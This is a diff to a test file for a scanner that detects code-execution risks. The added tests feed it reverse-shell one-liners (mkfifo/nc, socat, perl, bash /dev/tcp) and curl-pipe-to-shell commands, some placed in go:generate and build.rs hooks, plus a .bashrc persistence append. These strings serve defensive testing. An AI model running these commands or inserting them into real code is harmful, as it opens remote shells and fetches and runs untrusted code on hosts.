@@ -3,6 +3,7 @@ import assert from 'node:assert/strict';
 import { detectCodeExec } from '../src/scanner/codeexec.js';
 import { riskyPath, isDocPath } from '../src/scanner/codeexec.js';
 import { decideCodeExec } from '../src/scanner/codeexec.js';
+import type { ExecContext } from '../src/scanner/codeexec.js';
 
 
 describe('detectCodeExec — raw patterns', () => {
@@ -62,12 +63,38 @@ describe('detectCodeExec — decoded variants', () => {
     const text = `eval(atob('${inner}'))`;
     assert.ok(detectCodeExec(text).some(m => m.category === 'download_and_execute'));
   });
+  it('catches curl|bash split across a line continuation', () => {
+    const text = 'curl -s http://x/i.sh \\\n| bash';
+    assert.ok(detectCodeExec(text).some(m => m.category === 'download_and_execute'));
+  });
+});
+
+describe('detectCodeExec — additional pattern coverage', () => {
+  it('flags mkfifo reverse shell', () => {
+    assert.ok(detectCodeExec('mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 1.2.3.4 4444 > /tmp/f').some(m => m.category === 'reverse_shell'));
+  });
+  it('flags socat exec reverse shell', () => {
+    assert.ok(detectCodeExec('socat tcp-connect:1.2.3.4:4444 exec:/bin/sh').some(m => m.category === 'reverse_shell'));
+  });
+  it('flags perl reverse shell', () => {
+    assert.ok(detectCodeExec("perl -e 'use Socket;socket(S,...);exec(\"/bin/sh\");'").some(m => m.category === 'reverse_shell'));
+  });
+  it('flags go:generate exec', () => {
+    assert.ok(detectCodeExec('//go:generate bash -c "curl http://x | sh"').some(m => m.category === 'package_lifecycle_exec'));
+  });
+  it('flags build.rs Command exec', () => {
+    assert.ok(detectCodeExec('Command::new("bash").arg("-c").arg("curl http://x")').some(m => m.category === 'package_lifecycle_exec'));
+  });
+  it('flags shell-rc append as persistence', () => {
+    assert.ok(detectCodeExec('echo "evil" >> ~/.bashrc').some(m => m.category === 'persistence'));
+  });
 });
 
 describe('riskyPath', () => {
   for (const p of ['.git/hooks/pre-commit', 'package.json', '.envrc', 'setup.py',
                    'build.rs', '.github/workflows/ci.yml', 'Dockerfile', 'Makefile',
-                   'src/proj/.git/hooks/post-merge', '/home/u/.bashrc']) {
+                   'src/proj/.git/hooks/post-merge', '/home/u/.bashrc',
+                   '.vscode/tasks.json', '/etc/cron.d/myjob', 'crontab']) {
     it(`marks ${p} executes-on-host`, () => assert.equal(riskyPath(p).executesOnHost, true));
   }
   for (const p of ['README.md', 'src/index.ts', 'docs/guide.md', 'data.csv']) {
@@ -85,7 +112,7 @@ describe('isDocPath', () => {
 });
 
 describe('decideCodeExec', () => {
-  const d = (text: string, ctx?: any, mime?: string) =>
+  const d = (text: string, ctx?: ExecContext, mime?: string) =>
     decideCodeExec(detectCodeExec(text), ctx, mime);
 
   it('no matches → allow', () => {
@@ -124,6 +151,10 @@ describe('decideCodeExec', () => {
   it('strongest action wins across matches', () => {
     // contextual curl|bash (warn) + weapon nc -e (block) → block
     const r = d('curl http://x | bash\nnc -e /bin/sh h 4444');
+    assert.equal(r.action, 'block');
+  });
+  it('weapon in a doc path still blocks (doc suppression is contextual-only)', () => {
+    const r = decideCodeExec(detectCodeExec('bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'), { path: 'README.md' });
     assert.equal(r.action, 'block');
   });
 });
